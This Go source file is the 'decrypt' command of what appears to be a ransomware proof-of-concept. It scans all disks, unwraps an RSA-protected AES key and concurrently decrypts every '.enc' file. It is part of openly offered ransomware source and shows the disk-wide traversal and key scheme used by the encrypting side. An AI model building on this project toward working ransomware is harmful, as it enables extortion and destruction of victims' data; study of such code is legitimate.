package cmd

import (
	"davidlares/golang-ransomware-poc/decrypt"
	"davidlares/golang-ransomware-poc/mapper"
	"davidlares/golang-ransomware-poc/rsa"
	"fmt"

	"strings"

	"github.com/spf13/cobra"
)

var decryptCmd = &cobra.Command{
	Use:   "decrypt",
	Short: "Decrypt functionality",
	Long:  `Decrypt functionality built with GoLang.`,
	Run: func(cmd *cobra.Command, args []string) {
		// control
		decryptControl := make(chan struct{}, 10)
		// disks listing
		disks := mapper.ListingDisks()
		// decrypting RSA key
		rsa.RSADecryptionWithAES("private.pem")
		// looping
		for _, disk := range disks {
			// getting files
			files := mapper.MapFiles(disk, nil) // no file distinction (free now)
			// looping files
			for _, file := range files {
				if strings.HasSuffix(file, ".enc") {
					// adding to waitgroup
					mapper.Wg.Add(1)
					// decrypt control
					decryptControl <- struct{}{}
					go func(file string) {
						defer mapper.Wg.Done()
						defer func() { <-decryptControl }()
						// enc
						err := decrypt.DecryptWithXorAndAES(file, "aes_key.txt")
						if err != nil {
							fmt.Println("Error in decryption", file)
						}
					}(file)
				}
			}
		}
		mapper.Wg.Wait()
	},
}

// adding child commands to the encrypt command (= flags)
func init() {
	rootCmd.AddCommand(decryptCmd)
}
